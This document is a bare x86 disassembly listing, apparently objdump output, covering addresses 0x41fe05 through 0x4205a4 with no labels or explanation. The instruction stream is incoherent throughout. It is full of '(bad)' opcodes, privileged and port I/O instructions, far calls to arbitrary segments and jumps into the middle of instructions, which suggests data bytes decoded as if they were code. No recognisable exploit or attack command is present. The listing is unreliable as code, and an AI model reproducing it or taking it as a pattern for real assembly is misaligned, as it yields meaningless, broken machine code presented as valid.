  41fe05:	bound  esp,QWORD PTR [eax-0x2b]
  41fe08:	and    ch,BYTE PTR [ecx+0x27874cc0]
  41fe0e:	sub    BYTE PTR ds:0xea149cf2,0xe1
  41fe15:	add    BYTE PTR [eax-0x1e],cl
  41fe18:	ds push esp
  41fe1a:	cmp    al,0xe2
  41fe1c:	aas    
  41fe1d:	jl     0x41fe7d
  41fe1f:	(bad)  
  41fe20:	fmul   QWORD PTR [esi]
  41fe22:	mov    ebp,0x31964bb1
  41fe27:	and    al,0xfc
  41fe29:	or     edx,DWORD PTR [eax-0x7b]
  41fe2c:	sub    DWORD PTR [eax+0x65dc5bca],edx
  41fe32:	inc    ebx
  41fe33:	dec    ecx
  41fe34:	push   esp
  41fe35:	inc    ebx
  41fe36:	mov    ebp,DWORD PTR [edi+0x22697cba]
  41fe3c:	xor    al,0x7f
  41fe3e:	in     eax,0x62
  41fe40:	inc    edx
  41fe41:	mov    dl,0x5c
  41fe43:	in     eax,dx
  41fe44:	dec    eax
  41fe45:	xor    BYTE PTR [eax+0x4216933a],dl
  41fe4b:	xchg   ebp,eax
  41fe4c:	mov    eax,0x653c9d75
  41fe51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe52:	daa    
  41fe53:	jbe    0x41fe27
  41fe55:	iret   
  41fe56:	xchg   ebp,eax
  41fe57:	mov    cl,BYTE PTR [ebp+0x0]
  41fe5a:	pop    edi
  41fe5b:	div    DWORD PTR [ebx-0x55]
  41fe5e:	xchg   ebx,eax
  41fe5f:	(bad)  
  41fe60:	out    dx,al
  41fe61:	pop    esp
  41fe62:	cmp    al,0x30
  41fe64:	outs   dx,DWORD PTR ds:[esi]
  41fe65:	adc    DWORD PTR [ebp-0x45],ecx
  41fe68:	(bad)
  41fe6b:	push   edx
  41fe6c:	pushf  
  41fe6d:	outs   dx,DWORD PTR ds:[esi]
  41fe6e:	or     BYTE PTR [ebx],ch
  41fe70:	js     0x41fe8d
  41fe72:	mov    eax,0xd4a8dd26
  41fe77:	js     0x41fe77
  41fe79:	adc    al,0xcd
  41fe7b:	aam    0x3e
  41fe7d:	or     DWORD PTR [esi],ecx
  41fe7f:	js     0x41fe07
  41fe81:	imul   ebp,DWORD PTR [ebp*1-0x70b3a21f],0xffffffc8
  41fe89:	adc    al,0xe6
  41fe8b:	or     BYTE PTR [ebp+eax*8-0x3014a766],bh
  41fe92:	mov    edi,0x5ccd54c7
  41fe97:	ss ins BYTE PTR es:[edi],dx
  41fe99:	and    eax,0x5eb89695
  41fe9e:	mov    DWORD PTR [ebx+0x65cebdbe],edx
  41fea4:	cld    
  41fea5:	bound  esi,QWORD PTR [ebp+0x2f96f2fe]
  41feab:	inc    eax
  41feac:	fs xor al,0x70
  41feaf:	xor    al,0x64
  41feb1:	out    dx,eax
  41feb2:	sbb    eax,0xf606a6a4
  41feb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb8:	jp     0x41ff03
  41feba:	mov    esp,0x6eb372fe
  41febf:	adc    BYTE PTR [esi],dh
  41fec1:	or     al,0x78
  41fec3:	and    edx,DWORD PTR [edx-0x3]
  41fec6:	mov    WORD PTR [ebx-0x4c68cc38],?
  41fecc:	ltr    WORD PTR [eax]
  41fecf:	mov    ecx,DWORD PTR [esi+eiz*4]
  41fed2:	add    al,0x7d
  41fed4:	repz je 0x41feec
  41fed7:	cwde   
  41fed8:	adc    eax,0xf9839194
  41fedd:	sub    al,0x2f
  41fedf:	std    
  41fee0:	or     al,0x9b
  41fee2:	aas    
  41fee3:	cmc    
  41fee4:	test   eax,0xbdff1381
  41feea:	xchg   DWORD PTR [ebx],eax
  41feec:	adc    eax,0x371cdc5c
  41fef2:	cmp    eax,0xcf7052e0
  41fef7:	test   DWORD PTR [ebx],0x725fd655
  41fefd:	dec    ecx
  41fefe:	int3   
  41feff:	cmp    bl,al
  41ff01:	or     DWORD PTR [edi],0xa7580640
  41ff07:	nop
  41ff08:	gs int 0x7b
  41ff0b:	adc    esi,DWORD PTR ds:0x48f55c75
  41ff11:	jecxz  0x41ff89
  41ff13:	cmp    al,0xb3
  41ff15:	mov    BYTE PTR [edx-0x2882f18],dh
  41ff1b:	mov    DWORD PTR [edx-0x38ec88e4],esp
  41ff21:	(bad)  
  41ff22:	jmp    0x41feac
  41ff24:	aam    0x92
  41ff26:	mov    ecx,esi
  41ff28:	mov    esi,DWORD PTR [ebp-0x1b]
  41ff2b:	fs mov dl,0xa0
  41ff2e:	xor    ah,0xea
  41ff31:	xor    edi,DWORD PTR [ebx-0x1c6645ce]
  41ff37:	lods   al,BYTE PTR ds:[esi]
  41ff38:	imul   DWORD PTR [esi+esi*8+0x26]
  41ff3c:	sub    eax,0xd1de176a
  41ff41:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41ff43:	cli    
  41ff44:	ins    DWORD PTR es:[edi],dx
  41ff45:	std    
  41ff46:	(bad)  
  41ff47:	dec    DWORD PTR [edx]
  41ff49:	pop    esp
  41ff4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff4b:	mov    ch,0xba
  41ff4d:	js     0x41ff1a
  41ff4f:	jb     0x41ff7d
  41ff51:	pop    ecx
  41ff52:	stos   DWORD PTR es:[edi],eax
  41ff53:	mov    bl,0x8c
  41ff55:	add    DWORD PTR es:[esi+eax*1-0x5b4973d5],eax
  41ff5d:	loop   0x41ffa2
  41ff5f:	pop    esp
  41ff60:	mov    bl,0x0
  41ff63:	std    
  41ff64:	jne    0x41ffe5
  41ff66:	xor    dl,bl
  41ff68:	xchg   BYTE PTR [edx-0x35bd10e9],dl
  41ff6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff6f:	and    eax,0x8b8d4494
  41ff74:	js     0x41fefa
  41ff76:	jo     0x41ff8b
  41ff78:	iret   
  41ff79:	xlat   BYTE PTR ds:[ebx]
  41ff7a:	xor    eax,DWORD PTR [esi]
  41ff7c:	imul   edx,DWORD PTR [edi+0x11],0xffffffe9
  41ff80:	mov    edi,0x6e768536
  41ff85:	mov    cl,0x7f
  41ff87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff88:	ret    
  41ff89:	mov    gs,WORD PTR [ecx+0x1f]
  41ff8c:	push   edx
  41ff8d:	and    ah,BYTE PTR [ecx-0x4d]
  41ff90:	data16 (bad) 
  41ff92:	sbb    esp,edi
  41ff94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff97:	cdq    
  41ff98:	mov    al,0xc2
  41ff9a:	or     ebp,DWORD PTR [ecx+esi*8+0x647faa8f]
  41ffa1:	jno    0x41ff26
  41ffa3:	sar    BYTE PTR [ebx],0x1a
  41ffa6:	scas   eax,DWORD PTR es:[di]
  41ffa8:	jle    0x41ff2e
  41ffaa:	loop   0x41ff55
  41ffac:	push   ds
  41ffad:	sub    DWORD PTR [eax+0x29],0x81e2ae5b
  41ffb4:	lods   eax,DWORD PTR ds:[esi]
  41ffb5:	jo     0x41ff6d
  41ffb7:	sbb    al,BYTE PTR [esi+eiz*8]
  41ffba:	pop    ebp
  41ffbb:	xor    al,0x9
  41ffbd:	mov    ds:0x76e52fc9,eax
  41ffc2:	imul   ebp,edi,0xd
  41ffc5:	test   eax,0xe4f8a9c0
  41ffca:	jo     0x420037
  41ffcc:	mov    ecx,0xd2aa8351
  41ffd1:	jp     0x41ffee
  41ffd3:	stos   DWORD PTR es:[edi],eax
  41ffd4:	call   0x407f:0x986023bd
  41ffdb:	dec    ebx
  41ffdc:	cmc    
  41ffdd:	mov    eax,0xd5a59b45
  41ffe2:	cmp    bl,BYTE PTR [esi]
  41ffe4:	lock fist WORD PTR [edx]
  41ffe7:	aaa    
  41ffe8:	cwde   
  41ffe9:	ds sbb ebx,esp
  41ffec:	push   ax
  41ffee:	xor    eax,0xf81c1d01
  41fff3:	cmp    al,0xda
  41fff5:	push   0xe1e181f5
  41fffa:	mov    ebp,0x90592da4
  41ffff:	cmp    BYTE PTR [esi],ch
  420001:	and    BYTE PTR [edx],0xa3
  420004:	inc    edi
  420005:	mov    al,ds:0x2a0b0a9
  42000a:	push   ecx
  42000b:	sbb    BYTE PTR ds:0x93b8b8c9,cl
  420011:	jno    0x420025
  420013:	inc    edi
  420014:	or     esp,ebx
  420016:	mov    ds:0x60c5940f,eax
  42001b:	sub    BYTE PTR [esi],ah
  42001d:	fcomip st,st(7)
  42001f:	lods   eax,DWORD PTR ds:[esi]
  420020:	mov    eax,0xb47155f8
  420025:	and    eax,DWORD PTR [edx-0x6fd8710c]
  42002b:	add    al,0x2f
  42002d:	adc    al,BYTE PTR [esp+eiz*4]
  420030:	sub    eax,ebp
  420032:	(bad)
  420036:	sbb    ebx,ecx
  420038:	outs   dx,DWORD PTR ds:[esi]
  420039:	gs cmp edi,DWORD PTR ds:[esi]
  42003d:	pop    ebx
  42003e:	or     DWORD PTR [edi-0x60],esp
  420041:	gs or  al,0x1f
  420044:	repnz shl DWORD PTR [esi-0x4c],cl
  420048:	jle    0x4200ac
  42004a:	cmp    eax,0xe143873a
  42004f:	les    edi,FWORD PTR ds:0x778f7e5c
  420055:	sbb    DWORD PTR [ebx-0x79],ebx
  420058:	jno    0x41ffdf
  42005a:	adc    BYTE PTR [edi],bh
  42005c:	ins    BYTE PTR es:[edi],dx
  42005d:	fistp  DWORD PTR [ecx-0x2a]
  420060:	ds mov dl,0xc7
  420063:	sti    
  420064:	mov    ecx,0x6ef4f8f5
  420069:	jne    0xcdea769e
  42006f:	(bad)  
  420070:	hlt    
  420071:	xchg   edx,eax
  420072:	imul   esi,edx,0xffffff9e
  420075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420076:	push   cs
  420077:	leave  
  420078:	call   0xd945:0x3931e5e2
  42007f:	pop    ss
  420080:	inc    eax
  420081:	fs enter 0x8350,0x20
  420086:	aam    0x55
  420088:	fbstp  TBYTE PTR [ebx]
  42008a:	mov    ebp,0x41b7298b
  42008f:	jmp    0x42001c
  420091:	test   eax,0x51d7b18d
  420096:	ficomp DWORD PTR [ebx+0x71d45cb4]
  42009c:	mov    esp,0xacbc34f
  4200a1:	sub    DWORD PTR [ebx+0xb],edi
  4200a4:	add    DWORD PTR [ebp+0x7],edx
  4200a7:	add    DWORD PTR [edi],ebp
  4200a9:	or     al,0x59
  4200ab:	mov    ds:0x8635dcea,al
  4200b0:	jge    0x420095
  4200b2:	sbb    eax,0x496de23
  4200b7:	mov    ebx,esi
  4200b9:	cmp    eax,0x3792f33e
  4200be:	cmp    al,0x36
  4200c0:	and    al,0x45
  4200c2:	jmp    0x2c382972
  4200c7:	adc    DWORD PTR cs:[esi+0x60],ebx
  4200cb:	inc    ecx
  4200cc:	bound  edi,QWORD PTR [eax+0x24]
  4200cf:	jmp    0x1b1b:0xca08ea5a
  4200d6:	cmc    
  4200d7:	and    DWORD PTR [eax],ecx
  4200d9:	xchg   esp,eax
  4200da:	xchg   ebp,eax
  4200db:	pop    ss
  4200dc:	fisub  DWORD PTR [edx-0x7553c0f5]
  4200e2:	push   eax
  4200e3:	test   BYTE PTR [edi-0x4c],ch
  4200e6:	mov    ebx,0x8f85f8
  4200eb:	mov    bh,0x84
  4200ed:	cwde   
  4200ee:	inc    esp
  4200ef:	adc    al,0x96
  4200f1:	lds    esi,FWORD PTR [esi-0x3e1bcfa6]
  4200f7:	lods   eax,DWORD PTR ds:[esi]
  4200f8:	dec    edx
  4200f9:	pop    eax
  4200fa:	xor    DWORD PTR gs:[eax+0x3d],edi
  4200fe:	hlt    
  4200ff:	aas    
  420100:	fld    st(0)
  420102:	ins    DWORD PTR es:[edi],dx
  420103:	and    BYTE PTR [ebp-0x7c],ah
  420106:	outs   dx,DWORD PTR ds:[esi]
  420107:	imul   ebx,DWORD PTR ds:0x8c356e01,0x4d557fa7
  420111:	std    
  420112:	lds    ebp,FWORD PTR [ecx-0x1c]
  420115:	iret   
  420116:	xchg   DWORD PTR [ebx],edi
  420118:	(bad)  
  420119:	pop    esi
  42011a:	ret    0xd82d
  42011d:	ror    DWORD PTR [edi+0x7f],0xfb
  420121:	adc    al,0x43
  420123:	fstp   QWORD PTR [esi-0x558f32]
  420129:	dec    edx
  42012a:	inc    esp
  42012b:	(bad)  
  42012c:	jecxz  0x420174
  42012e:	dec    esp
  42012f:	ffree  st(6)
  420131:	jg     0x420122
  420133:	jg     0x420114
  420135:	outs   dx,DWORD PTR ds:[esi]
  420136:	jb     0x420123
  420138:	sub    BYTE PTR [esi+0x65a107f4],dl
  42013e:	sub    BYTE PTR [ecx],0x19
  420141:	enter  0x8993,0xb6
  420145:	clc    
  420146:	pop    edx
  420147:	push   esp
  420148:	gs adc al,0x98
  42014b:	ins    BYTE PTR es:[edi],dx
  42014c:	push   edx
  42014d:	fwait
  42014e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42014f:	retf   
  420150:	dec    esi
  420151:	cmc    
  420152:	mov    edi,0xdc814eda
  420157:	jnp    0x42010c
  420159:	das    
  42015a:	shr    BYTE PTR [eax-0x7c],0x43
  42015e:	mov    eax,ds:0xa0f8a161
  420163:	jecxz  0x42017b
  420165:	jl     0x42012f
  420167:	pop    eax
  420168:	inc    ebx
  420169:	jle    0x4201d3
  42016b:	test   eax,0x82128e83
  420170:	jmp    0x247f:0xd8547354
  420177:	add    bh,BYTE PTR [ecx+0x6dbcab2d]
  42017d:	add    BYTE PTR [edi],dh
  42017f:	dec    edx
  420180:	(bad)  
  420182:	nop
  420183:	xlat   BYTE PTR ds:[ebx]
  420184:	daa    
  420185:	mov    edi,edx
  420187:	xor    DWORD PTR [esi-0x43],ebp
  42018a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018b:	mov    dl,0xec
  42018d:	mov    edi,0x4cd5b9d2
  420192:	sub    al,0xdf
  420194:	cmp    BYTE PTR [ebx+0x60],cl
  420197:	test   DWORD PTR [ebx+ebx*1+0x63019998],eax
  42019e:	push   edi
  42019f:	test   BYTE PTR [esi-0x47],ch
  4201a2:	idiv   DWORD PTR [edi-0x106f5722]
  4201a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a9:	sub    al,0xc4
  4201ab:	add    eax,0xf334effc
  4201b0:	pop    ss
  4201b1:	scas   al,BYTE PTR es:[edi]
  4201b2:	fist   DWORD PTR [edx+0x7c53b8f3]
  4201b8:	into   
  4201b9:	stc    
  4201ba:	sub    ebx,edi
  4201bc:	mov    BYTE PTR [eax],al
  4201be:	aam    0xdd
  4201c0:	aad    0xd0
  4201c2:	std    
  4201c3:	xchg   ebx,eax
  4201c4:	pop    ss
  4201c5:	popa   
  4201c6:	ja     0x4201de
  4201c8:	xor    bh,BYTE PTR [eax+0x2c]
  4201cb:	mov    bh,0x85
  4201cd:	jge    0x4201c5
  4201cf:	fdiv   DWORD PTR [ecx]
  4201d1:	ja     0x420231
  4201d3:	jns    0x4201bd
  4201d5:	fcomp  DWORD PTR [eax]
  4201d7:	xor    BYTE PTR [ecx-0x25],bh
  4201da:	push   ebp
  4201db:	and    ebx,DWORD PTR [edx-0x6c]
  4201de:	mov    eax,ds:0xffbb6921
  4201e3:	test   BYTE PTR [ecx*1+0x7b4e9439],al
  4201ea:	mov    al,BYTE PTR [edi+ecx*8+0x6d]
  4201ee:	mov    bl,0xe5
  4201f0:	push   ecx
  4201f1:	arpl   WORD PTR [ebp-0x24331a15],bp
  4201f7:	in     eax,0xd8
  4201f9:	jbe    0x420231
  4201fb:	dec    eax
  4201fc:	shr    DWORD PTR [edx],cl
  4201fe:	and    cl,BYTE PTR [edx+0x3fc52d70]
  420204:	(bad)  
  420205:	mov    esp,0x9640c39d
  42020a:	mov    BYTE PTR [esi-0x47],dl
  42020d:	mov    edi,ss
  42020f:	mov    al,0x84
  420211:	xchg   edi,eax
  420212:	imul   DWORD PTR [ecx+0x20]
  420215:	mov    cs,WORD PTR [eax]
  420217:	mov    cl,BYTE PTR [ebp-0x78]
  42021a:	imul   BYTE PTR [ecx-0x62]
  42021d:	inc    ebx
  42021e:	inc    eax
  42021f:	sub    al,0xb4
  420221:	pop    edx
  420222:	adc    dh,BYTE PTR [ecx+esi*4]
  420225:	xor    eax,0x214eb3bb
  42022a:	pop    ebp
  42022b:	xchg   DWORD PTR [esi],ecx
  42022d:	mov    edi,0x3fb4643d
  420232:	cs addr16 pop esi
  420235:	(bad)  
  420236:	ins    BYTE PTR es:[edi],dx
  420237:	fistp  QWORD PTR [eax+ecx*2]
  42023a:	add    bh,BYTE PTR [ebx-0x29]
  42023d:	in     al,dx
  42023e:	stos   BYTE PTR es:[edi],al
  42023f:	push   ebx
  420240:	ror    DWORD PTR [edi-0x34150863],0x94
  420247:	add    eax,0x29f3c005
  42024c:	pop    ecx
  42024d:	(bad)  
  42024e:	jnp    0x420203
  420250:	mov    al,BYTE PTR [eax+0x17380228]
  420256:	adc    BYTE PTR [ecx+0x7b],bh
  420259:	inc    eax
  42025a:	jo     0x4201ee
  42025c:	test   ch,ah
  42025e:	mov    bh,0x70
  420260:	and    DWORD PTR [eax-0x64],edi
  420263:	lods   eax,DWORD PTR ds:[esi]
  420264:	clc    
  420265:	in     eax,dx
  420266:	or     ebx,edx
  420268:	mov    cl,0x99
  42026a:	dec    esi
  42026b:	add    eax,DWORD PTR es:[ecx+0x2cc30362]
  420272:	sbb    bl,ch
  420274:	inc    ebp
  420275:	in     al,0xe
  420277:	cmp    ebx,ebp
  420279:	add    al,0xfc
  42027b:	retf   
  42027c:	ficom  WORD PTR [ebx+0x6af9e185]
  420282:	mov    dl,0x53
  420284:	add    al,0xb2
  420286:	adc    dl,ah
  420288:	adc    BYTE PTR [ecx+edi*2+0x39],dh
  42028c:	fist   WORD PTR [ebp-0x2b]
  42028f:	std    
  420290:	loopne 0x4202ac
  420292:	sbb    al,0x80
  420294:	fstp   DWORD PTR [edi+0x3728ba9e]
  42029a:	adc    edx,edx
  42029c:	xor    bl,BYTE PTR [edx+edi*1-0x1b543b4a]
  4202a3:	push   ds
  4202a4:	or     bl,BYTE PTR [esi+0x3d]
  4202a7:	xchg   edx,eax
  4202a8:	in     al,0x33
  4202aa:	call   0x4205:0x99977445
  4202b1:	xchg   cl,bh
  4202b3:	dec    ecx
  4202b4:	push   esi
  4202b5:	inc    esi
  4202b6:	les    edx,FWORD PTR gs:0xa7198155
  4202bd:	cmp    BYTE PTR [ebp+0x5c0f03b2],ch
  4202c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202c4:	pop    ss
  4202c5:	mov    ecx,0x9584080a
  4202ca:	sub    BYTE PTR [ebp-0x51],dl
  4202cd:	dec    ebp
  4202ce:	bound  ecx,QWORD PTR [ebx-0x2776d456]
  4202d4:	mov    ds:0x667c57f9,al
  4202d9:	aam    0xf5
  4202db:	loope  0x4202f0
  4202dd:	jmp    0xca0cc94c
  4202e2:	mov    ds:0x29f4df55,eax
  4202e7:	ja     0x420307
  4202e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ea:	pop    ebx
  4202eb:	stos   BYTE PTR es:[edi],al
  4202ec:	adc    BYTE PTR [ebp+esi*8-0x5e],bh
  4202f0:	push   ds
  4202f1:	jns    0x42028e
  4202f3:	fild   DWORD PTR ss:[esi]
  4202f6:	pop    es
  4202f7:	pusha  
  4202f8:	call   0x9d4b1d5
  4202fd:	pop    ebp
  4202fe:	imul   esi,DWORD PTR [ebx],0x2c1cd8a
  420304:	cmp    DWORD PTR [ebx+0x7d],esi
  420307:	daa    
  420308:	les    esp,FWORD PTR [edx+0x69]
  42030b:	and    dl,BYTE PTR [eax]
  42030d:	iret   
  42030e:	and    BYTE PTR [ecx+0x5bbc60bd],0x85
  420315:	xor    al,0xac
  420317:	scas   eax,DWORD PTR es:[edi]
  420318:	inc    edx
  420319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42031a:	sbb    BYTE PTR [esp+ecx*2],0x49
  42031e:	push   eax
  42031f:	dec    ebp
  420320:	pop    ss
  420321:	test   al,0xd1
  420323:	mov    ds:0x3e305dff,al
  420328:	repnz mov ?,WORD PTR [edx-0x2687850a]
  42032f:	jno    0x420353
  420331:	out    dx,ax
  420333:	div    bh
  420335:	add    al,0x4b
  420337:	sub    DWORD PTR [ecx+edx*8],ecx
  42033a:	pop    es
  42033b:	and    eax,0xc259aa22
  420340:	repnz pop ebp
  420342:	add    eax,0xf14d756d
  420347:	or     BYTE PTR [edx],bh
  420349:	bound  esi,QWORD PTR [ecx]
  42034b:	arpl   WORD PTR [edx-0x1f],bx
  42034e:	fs jmp 0x420321
  420351:	fs xchg edx,eax
  420353:	mov    al,ds:0x976d32d0
  420358:	into   
  420359:	out    dx,al
  42035a:	lds    ebp,FWORD PTR [esi-0x42]
  42035d:	pop    es
  42035e:	cmp    WORD PTR [eax+0x4e],dx
  420362:	loop   0x420394
  420364:	push   edx
  420365:	repz ja 0x420390
  420368:	mov    eax,0xebbf77f5
  42036d:	loope  0x4203c9
  42036f:	fmul   st,st(1)
  420371:	dec    esi
  420372:	mov    esp,0xa4d02423
  420377:	jbe    0x4203a6
  420379:	jno    0x420355
  42037b:	xor    bl,dl
  42037d:	adc    eax,0x3eab0867
  420382:	scas   eax,DWORD PTR es:[edi]
  420383:	xlat   BYTE PTR ds:[ebx]
  420384:	xchg   ecx,eax
  420385:	addr16 shl cl,0x31
  420389:	add    edi,ebx
  42038b:	jmp    0x69dbbc75
  420390:	fdivr  DWORD PTR [edx]
  420392:	sub    bl,BYTE PTR [edx-0x28b68f2d]
  420398:	cld    
  420399:	dec    edx
  42039a:	push   edi
  42039b:	jge    0x4203e2
  42039d:	xor    edx,DWORD PTR [esi]
  42039f:	dec    ebp
  4203a0:	shr    BYTE PTR [bp+di-0xa3b],0x31
  4203a6:	loopne 0x4203a0
  4203a8:	call   0x1eab5c8e
  4203ad:	dec    edi
  4203ae:	push   edi
  4203af:	ja     0x4203c9
  4203b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b2:	imul   ebx,esp,0xc3ef5336
  4203b8:	retf   0x7ab9
  4203bb:	gs jmp 0x4203e8
  4203be:	jno    0x420410
  4203c0:	dec    esp
  4203c1:	loopne 0x4203e5
  4203c3:	jmp    0x9a3ccab3
  4203c8:	sbb    eax,0x5d28ed0d
  4203cd:	mov    al,ds:0xbad1c215
  4203d2:	scas   al,BYTE PTR es:[edi]
  4203d3:	push   ss
  4203d4:	inc    esp
  4203d5:	in     eax,dx
  4203d6:	popf   
  4203d7:	aad    0x23
  4203d9:	sbb    ebp,DWORD PTR [ebx+0x43]
  4203dc:	sub    esi,DWORD PTR [ebx+eax*1]
  4203df:	dec    ebp
  4203e0:	aad    0xcd
  4203e2:	add    DWORD PTR [edx],0x8e8998dd
  4203e8:	inc    edx
  4203e9:	aam    0x82
  4203eb:	adc    al,cl
  4203ed:	mov    eax,ds:0xf5fd0b18
  4203f2:	inc    ebx
  4203f3:	test   BYTE PTR [eax-0x5d],al
  4203f6:	(bad)  
  4203f7:	xor    DWORD PTR [ecx+0x1cf05b25],ebp
  4203fd:	shr    DWORD PTR [esi],1
  4203ff:	pop    ds
  420400:	xor    BYTE PTR [esi+ebx*2],al
  420403:	das    
  420404:	(bad)  
  420407:	test   al,0x5a
  420409:	cld    
  42040a:	sbb    eax,0xb6fefac5
  42040f:	xlat   BYTE PTR ds:[ebx]
  420410:	mov    bl,0x71
  420412:	sbb    bh,dh
  420414:	xchg   ebx,eax
  420415:	repz std 
  420417:	xchg   DWORD PTR [ebx-0x58],ebx
  42041a:	push   ecx
  42041b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42041c:	xlat   BYTE PTR ds:[ebx]
  42041d:	iret   
  42041e:	and    al,BYTE PTR [ebx-0xc]
  420421:	xlat   BYTE PTR ds:[ebx]
  420422:	iret   
  420423:	out    0xd1,eax
  420425:	mov    bh,0xac
  420427:	mov    al,0xe6
  420429:	(bad)  
  42042a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42042b:	fsubr  st(6),st
  42042d:	clc    
  42042e:	pop    ebx
  42042f:	sub    DWORD PTR [edi],0x6e877f82
  420435:	(bad)  
  420436:	jb     0x4203ed
  420438:	ds clc 
  42043a:	je     0x420419
  42043c:	push   0x5
  42043e:	inc    ebx
  42043f:	in     al,0x85
  420441:	adc    al,dl
  420443:	imul   esi,ebp,0xffffff9b
  420446:	mov    ebx,0xc40b3a08
  42044b:	and    edi,ecx
  42044d:	jnp    0x42042e
  42044f:	sub    al,BYTE PTR [edx]
  420451:	enter  0x5511,0x2a
  420455:	inc    esp
  420456:	add    BYTE PTR [ebx-0x7e808326],0xc0
  42045d:	xor    al,0x4d
  42045f:	int3   
  420460:	or     eax,0xe86d8e7a
  420465:	mov    cl,BYTE PTR [edx+ecx*4+0x3c]
  420469:	ins    DWORD PTR es:[edi],dx
  42046a:	add    edi,DWORD PTR [ecx-0x1cf66497]
  420470:	or     eax,0xc5856205
  420475:	push   ecx
  420476:	pop    esp
  420477:	sahf   
  420478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420479:	xlat   BYTE PTR ds:[ebx]
  42047a:	sbb    eax,0x54b17649
  42047f:	in     eax,dx
  420480:	dec    edx
  420481:	(bad)  
  420482:	aam    0x42
  420484:	stos   BYTE PTR es:[edi],al
  420485:	addr16 push 0x55b4d021
  42048b:	mov    ebp,0x857e80cb
  420490:	pop    ebp
  420491:	popa   
  420492:	test   al,0xea
  420494:	or     BYTE PTR [ebx],0x2c
  420497:	jb     0x420462
  420499:	test   eax,0x7b8a435d
  42049e:	aam    0xf6
  4204a0:	rcr    BYTE PTR [eax-0x5407b864],cl
  4204a6:	and    BYTE PTR [ebx],0x7c
  4204a9:	inc    ebp
  4204aa:	or     BYTE PTR [edi+0x5a],al
  4204ad:	mov    ss,WORD PTR [ecx+0x1c]
  4204b0:	lock scas eax,DWORD PTR es:[edi]
  4204b2:	imul   ebp,edx,0xffffffa9
  4204b5:	cmp    al,0xb
  4204b7:	push   ss
  4204b8:	ret    0x7f91
  4204bb:	or     eax,0xf3cd23d7
  4204c0:	add    DWORD PTR [ecx],0xfabd360e
  4204c6:	sbb    DWORD PTR [esi+0x14a317ba],0xe7af3c0b
  4204d0:	(bad)  
  4204d1:	sahf   
  4204d2:	fist   WORD PTR [edi+0x30]
  4204d5:	popf   
  4204d6:	mov    eax,ds:0x1ae6d8c5
  4204db:	scas   eax,DWORD PTR es:[edi]
  4204dc:	pop    eax
  4204dd:	fcom   QWORD PTR [eax-0x4c1d73fb]
  4204e3:	out    dx,al
  4204e4:	jae    0x42054a
  4204e6:	or     DWORD PTR [edi],edi
  4204e8:	out    0x6e,al
  4204ea:	push   ecx
  4204eb:	jbe    0x4204ee
  4204ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204ee:	call   0xd49b:0x56346480
  4204f5:	xor    BYTE PTR [ebp-0x42],bl
  4204f8:	mov    bh,0x34
  4204fa:	add    BYTE PTR [esi-0x37acd328],ah
  420500:	jns    0x4204c8
  420502:	or     edi,ecx
  420504:	cmc    
  420505:	out    dx,al
  420506:	sub    DWORD PTR [ebp+0x51],esi
  420509:	repz dec ecx
  42050b:	mov    ch,0x23
  42050d:	and    edx,0x6cfec619
  420513:	clc    
  420514:	or     BYTE PTR [esi+0x76],0xc8
  420518:	dec    edx
  420519:	fsubr  DWORD PTR [edx]
  42051b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42051c:	data16 shl BYTE PTR [edi],1
  42051f:	sbb    eax,DWORD PTR ds:0x8da478c6
  420525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420526:	xchg   ecx,eax
  420527:	fisttp WORD PTR [edx+0x2]
  42052a:	push   cs
  42052b:	xchg   esi,eax
  42052c:	sub    ch,BYTE PTR [eax-0x6085c1dd]
  420532:	xchg   esp,eax
  420533:	fs gs icebp 
  420536:	mov    esp,0x7a910c93
  42053b:	adc    edx,DWORD PTR [esi]
  42053d:	outs   dx,DWORD PTR ds:[esi]
  42053e:	xor    al,0xcf
  420540:	mov    edx,0xb6794f7e
  420545:	repnz sub esp,DWORD PTR fs:[eax+0x7f]
  42054a:	xchg   BYTE PTR [esi-0x17f6cd1],bl
  420550:	dec    ebx
  420551:	add    ah,dh
  420553:	call   0x4394eb65
  420558:	push   0x31
  42055a:	jne    0x420526
  42055c:	loope  0x4205a6
  42055e:	push   ebp
  42055f:	sahf   
  420560:	xor    eax,0x1b51adb5
  420565:	xchg   esp,eax
  420566:	xchg   ah,ch
  420568:	inc    ebp
  420569:	xchg   ebx,eax
  42056a:	aad    0x51
  42056c:	dec    ecx
  42056d:	adc    eax,DWORD PTR [ebx+ecx*4-0x2592f7cd]
  420574:	mov    ebx,ebp
  420576:	jmp    DWORD PTR [eax]
  420578:	pop    ecx
  420579:	mov    ebx,0x83ac58ad
  42057e:	test   BYTE PTR [ebp-0x22e806c],ch
  420584:	jge    0x42056f
  420586:	mov    bl,0xb
  420588:	fldcw  WORD PTR [eax]
  42058a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058b:	sub    BYTE PTR ss:[edi],ch
  42058e:	lods   eax,DWORD PTR ds:[esi]
  42058f:	adc    eax,0x6e52754a
  420594:	push   edi
  420595:	cwde   
  420596:	mov    eax,0x5fc918fe
  42059b:	ins    BYTE PTR es:[edi],dx
  42059c:	jle    0x4205ff
  42059e:	jno    0x4205e2
  4205a0:	sbb    cl,al
  4205a2:	(bad)  
  4205a3:	pop    ecx
  4205a4:	and    al,0x23
